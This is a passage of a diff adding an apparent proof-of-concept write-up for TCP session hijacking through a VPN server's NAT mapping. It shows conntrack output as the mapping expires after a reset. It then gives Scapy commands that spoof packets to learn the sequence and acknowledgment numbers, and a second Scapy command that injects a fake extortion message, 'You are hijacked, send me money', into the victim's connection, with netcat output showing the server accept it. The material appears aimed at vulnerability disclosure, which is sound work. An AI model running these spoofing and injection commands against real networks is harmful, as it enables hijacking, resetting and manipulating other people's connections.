+VPN-server@VPN-server:~$sudo conntrack -L | grep 43.159.39.110
+tcp 6 431841 ESTABLISHED src=10.8.0.3 dst=43.159.39.110 sport=40000 dport=80 src=43.159.39.110 dst=10.203.0.5 sport=80 dport=40000 [ASSURED]mark=0 use=1
+VPN-server@VPN-server:~$#####After RST
+VPN-server@VPN-server:~$sudo conntrack -L | grep 43.159.39.110
+tcp 6 10 ESTABLISHED src=10.8.0.3 dst=43.159.39.110 sport=40000 dport=80 src=43.159.39.110 dst=10.203.0.5 sport=80 dport=40000 [ASSURED]mark=0 use=1
+VPN-server@VPN-server:~$#####After 10 seconds
+VPN-server@VPN-server:~$sudo conntrack -L | grep 43.159.39.110
+tcp 6 0 ESTABLISHED src=10.8.0.3 dst=43.159.39.110 sport=40000 dport=80 src=43.159.39.110 dst=10.203.0.5 sport=80 dport=40000 [ASSURED]mark=0 use=1
+VPN-server@VPN-server:~$#####After that
+VPN-server@VPN-server:~$sudo conntrack -L | grep 43.159.39.110
+------------------
+
+(2) After the NAT mapping disappears, the attacker constructs a TCP data packet to the server. After NAT, it seems the same as those sent from the victim client. The server will respond an ACK packet back to the attacker, which contains the correct sequence and acknowledge numbers as shown below:
+------------------
+local-attacker@local-attacker:~$ sudo scapy
+>>>send(IP(src="10.8.0.2",dst=43.159.39.110")/TCP(seq=1,ack=1,sport=40000,dport=80,flags="PA"),iface="tun0")
+
+local-attacker@local-attacker:~$ sudo tcpdump -i any -nSvvv host 43.159.39.110
+16:44:21.141636 tun0 Out IP (tos Ox0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 40)
+    10.8.0.2.40000 > 43.159.39.110.80: Flags [P.], cksum 0x9623 (correct), seq 1, ack 1, win 8192, length 0
+16:44:21.255077 tun0 In IP (tos 0x64, ttl 54, id 20259, offset 0, flags [DF], proto TCP (6), length 52)
+    43.159.39.110.80 >10.8.0.2.40000: Flags [.],cksum Ox651c (correct), seq 1319804847, ack 684909974, win 509, options[nop,nop,TS val 1722395496 ecr 995347412], length 0
+------------------
+
+3.3 In the third step, the attacker can use the obtained source port, sequence number, acknowledge number, etc. to choose to send an RST packet to terminate the original TCP connection (such as SSH service, etc.), inject fake messages into the original TCP connection to manipulate the sessions (such as Web HTTP pages, etc.), or send requests to the server.
+------------------
+local-attacker@local-attacker:~$ sudo scapy
+>>>send(IP(src="10.8.0.2",dst=43.159.39.110")/TCP(seq=684909974,ack=1319804847,sport=40000,dport=80,flags="PA")/"You are hijacked, send me money",iface="tun0")
+------------------
+On the server machine, the spoofed messages will be accepted as the sequence and acknowledgment numbers are right.
+------------------
+remote-server@remote-server:~$sudo nc -l -p 80
+hello,i'm client
+HELLO,I'M SERVER
+You are hijacked, send me money
+------------------------------
+
 
